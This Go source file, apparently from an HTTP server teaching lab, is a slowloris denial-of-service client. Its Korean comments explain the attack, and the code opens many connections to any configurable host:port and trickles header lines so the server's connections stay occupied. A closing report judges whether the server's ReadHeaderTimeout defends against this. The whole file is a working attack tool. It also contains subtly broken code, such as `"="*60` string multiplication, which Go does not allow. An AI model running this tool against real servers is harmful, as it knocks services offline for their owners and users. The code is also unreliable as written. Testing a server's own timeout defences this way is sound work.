// cmd/slowloris는 slowloris 공격을 시뮬레이션하는 클라이언트다.
//
// Slowloris 공격 원리:
//   1. 많은 TCP 연결을 동시에 열고
//   2. HTTP 헤더를 아주 천천히 보내서 (\r\n\r\n을 지연)
//   3. 서버의 goroutine과 연결을 장시간 점유
//   4. 새 요청을 처리할 수 없게 만듦 (DoS)
//
// 이 도구는 교육/실험 목적으로만 사용해야 한다.
// 허가 없이 타인의 서버에 사용하면 불법이다.
//
// 실험 목적:
//   - ReadHeaderTimeout 유무에 따른 서버 동작 차이 관찰
//   - goroutine/FD 자원 점유 측정
//   - timeout 발동 시점 확인
//
// 사용 예:
//
//	# 기본 실행 (100개 연결, 1초 간격)
//	./slowloris -target=localhost:8080 -conns=100 -delay=1s
//
//	# 더 공격적 (500개 연결, 500ms 간격)
//	./slowloris -target=localhost:8080 -conns=500 -delay=500ms
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/ahwlsqja/go-http-lab/internal/logger"
	"github.com/rs/zerolog"
)

// Config holds slowloris configuration.
type Config struct {
	Target       string        // 타겟 서버 주소 (host:port)
	NumConns     int           // 동시 연결 수
	Delay        time.Duration // 헤더 라인 사이 딜레이
	Duration     time.Duration // 총 실행 시간 (0 = 무제한)
	KeepOpen     bool          // 헤더 완료 후에도 연결 유지
	Debug        bool          // 디버그 로깅
	ReportInterval time.Duration // 통계 리포트 간격
}

// Stats tracks attack statistics.
type Stats struct {
	activeConns   atomic.Int64 // 현재 활성 연결 수
	totalConns    atomic.Int64 // 총 시도한 연결 수
	closedByServer atomic.Int64 // 서버가 닫은 연결 수 (timeout)
	errors        atomic.Int64 // 연결 에러 수
	headersSent   atomic.Int64 // 보낸 헤더 라인 수
}

var (
	log   zerolog.Logger
	stats Stats
)

func main() {
	cfg := parseFlags()

	// 로거 초기화
	log = logger.New(cfg.Debug)
	log.Info().
		Str("target", cfg.Target).
		Int("connections", cfg.NumConns).
		Dur("delay", cfg.Delay).
		Dur("duration", cfg.Duration).
		Msg("starting slowloris attack simulation")

	// 종료 시그널 처리
	ctx := make(chan struct{})
	go func() {
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
		log.Info().Msg("shutdown signal received")
		close(ctx)
	}()

	// Duration 타이머 (설정된 경우)
	if cfg.Duration > 0 {
		go func() {
			time.Sleep(cfg.Duration)
			log.Info().Dur("duration", cfg.Duration).Msg("duration reached")
			close(ctx)
		}()
	}

	// 통계 리포터 시작
	go statsReporter(ctx, cfg.ReportInterval)

	// 워커 풀 시작
	var wg sync.WaitGroup
	for i := 0; i < cfg.NumConns; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			slowlorisWorker(ctx, cfg, id)
		}(i)

		// 연결을 점진적으로 열기 (서버 과부하 방지)
		time.Sleep(10 * time.Millisecond)
	}

	// 종료 대기
	<-ctx
	log.Info().Msg("waiting for workers to finish...")

	// 잠시 대기 후 최종 통계 출력
	time.Sleep(500 * time.Millisecond)
	printFinalStats()
}

func parseFlags() Config {
	cfg := Config{}

	flag.StringVar(&cfg.Target, "target", "localhost:8080", "target server address (host:port)")
	flag.IntVar(&cfg.NumConns, "conns", 100, "number of concurrent connections")
	flag.DurationVar(&cfg.Delay, "delay", 1*time.Second, "delay between header lines")
	flag.DurationVar(&cfg.Duration, "duration", 0, "total attack duration (0 = until interrupted)")
	flag.BoolVar(&cfg.KeepOpen, "keep-open", true, "keep sending headers to maintain connection")
	flag.BoolVar(&cfg.Debug, "debug", false, "enable debug logging")
	flag.DurationVar(&cfg.ReportInterval, "report-interval", 5*time.Second, "stats report interval")

	flag.Parse()
	return cfg
}

// slowlorisWorker는 단일 slowloris 연결을 관리한다.
func slowlorisWorker(ctx <-chan struct{}, cfg Config, id int) {
	for {
		select {
		case <-ctx:
			return
		default:
		}

		// 연결 시도
		conn, err := net.DialTimeout("tcp", cfg.Target, 10*time.Second)
		if err != nil {
			stats.errors.Add(1)
			log.Debug().Err(err).Int("worker", id).Msg("connection failed")
			time.Sleep(cfg.Delay) // 재시도 전 대기
			continue
		}

		stats.totalConns.Add(1)
		stats.activeConns.Add(1)

		log.Debug().Int("worker", id).Str("local", conn.LocalAddr().String()).Msg("connected")

		// slowloris 공격 수행
		closedByServer := performSlowloris(ctx, conn, cfg, id)

		conn.Close()
		stats.activeConns.Add(-1)

		if closedByServer {
			stats.closedByServer.Add(1)
			log.Debug().Int("worker", id).Msg("connection closed by server (timeout?)")
		}

		// 재연결 전 약간의 대기
		select {
		case <-ctx:
			return
		case <-time.After(100 * time.Millisecond):
		}
	}
}

// performSlowloris는 단일 연결에서 slowloris 공격을 수행한다.
// 서버가 연결을 끊으면 true를 반환한다.
func performSlowloris(ctx <-chan struct{}, conn net.Conn, cfg Config, id int) bool {
	reader := bufio.NewReader(conn)

	// HTTP 요청 시작 (첫 줄)
	_, err := fmt.Fprintf(conn, "GET /?worker=%d HTTP/1.1\r\n", id)
	if err != nil {
		return true
	}
	stats.headersSent.Add(1)

	// Host 헤더 (필수)
	time.Sleep(cfg.Delay)
	select {
	case <-ctx:
		return false
	default:
	}

	_, err = fmt.Fprintf(conn, "Host: %s\r\n", cfg.Target)
	if err != nil {
		return true
	}
	stats.headersSent.Add(1)

	// User-Agent 헤더
	time.Sleep(cfg.Delay)
	select {
	case <-ctx:
		return false
	default:
	}

	_, err = conn.Write([]byte("User-Agent: slowloris-go/1.0\r\n"))
	if err != nil {
		return true
	}
	stats.headersSent.Add(1)

	// 추가 헤더를 계속 보내서 연결 유지
	headerNum := 0
	for {
		select {
		case <-ctx:
			return false
		case <-time.After(cfg.Delay):
		}

		// 서버가 응답을 보내는지 확인 (non-blocking)
		conn.SetReadDeadline(time.Now().Add(1 * time.Millisecond))
		_, err := reader.Peek(1)
		conn.SetReadDeadline(time.Time{}) // deadline 해제

		if err == nil {
			// 서버가 응답을 보냄 - 연결이 진행됨 (예상치 못한 상황)
			log.Debug().Int("worker", id).Msg("server sent response unexpectedly")
			return false
		}

		// 타임아웃이 아닌 다른 에러면 서버가 연결을 끊은 것
		if netErr, ok := err.(net.Error); !ok || !netErr.Timeout() {
			return true // 서버가 연결 끊음
		}

		// 커스텀 헤더 보내기 (절대 \r\n\r\n을 보내지 않음!)
		headerNum++
		headerLine := fmt.Sprintf("X-Slowloris-%d: %d\r\n", headerNum, time.Now().UnixNano())
		_, err = conn.Write([]byte(headerLine))
		if err != nil {
			return true // 서버가 연결 끊음
		}
		stats.headersSent.Add(1)

		if !cfg.KeepOpen && headerNum >= 10 {
			// keep-open이 false면 10개 헤더 후 종료
			return false
		}
	}
}

// statsReporter는 주기적으로 통계를 출력한다.
func statsReporter(ctx <-chan struct{}, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx:
			return
		case <-ticker.C:
			log.Info().
				Int64("active_conns", stats.activeConns.Load()).
				Int64("total_conns", stats.totalConns.Load()).
				Int64("closed_by_server", stats.closedByServer.Load()).
				Int64("errors", stats.errors.Load()).
				Int64("headers_sent", stats.headersSent.Load()).
				Msg("stats")
		}
	}
}

// printFinalStats는 최종 통계를 출력한다.
func printFinalStats() {
	fmt.Println("\n" + "="*60)
	fmt.Println("SLOWLORIS ATTACK SIMULATION RESULTS")
	fmt.Println("="*60)
	fmt.Printf("Total connections attempted: %d\n", stats.totalConns.Load())
	fmt.Printf("Connections closed by server: %d\n", stats.closedByServer.Load())
	fmt.Printf("Connection errors: %d\n", stats.errors.Load())
	fmt.Printf("Total headers sent: %d\n", stats.headersSent.Load())
	fmt.Println("="*60)

	if stats.closedByServer.Load() > 0 {
		fmt.Println("\n[ANALYSIS]")
		fmt.Println("Server closed connections - likely due to ReadHeaderTimeout.")
		fmt.Println("This is GOOD server configuration for DoS protection!")
	} else if stats.totalConns.Load() > 0 && stats.closedByServer.Load() == 0 {
		fmt.Println("\n[ANALYSIS]")
		fmt.Println("Server did NOT close slow connections!")
		fmt.Println("This server may be VULNERABLE to slowloris attacks.")
		fmt.Println("Recommendation: Set ReadHeaderTimeout in http.Server config.")
	}
}
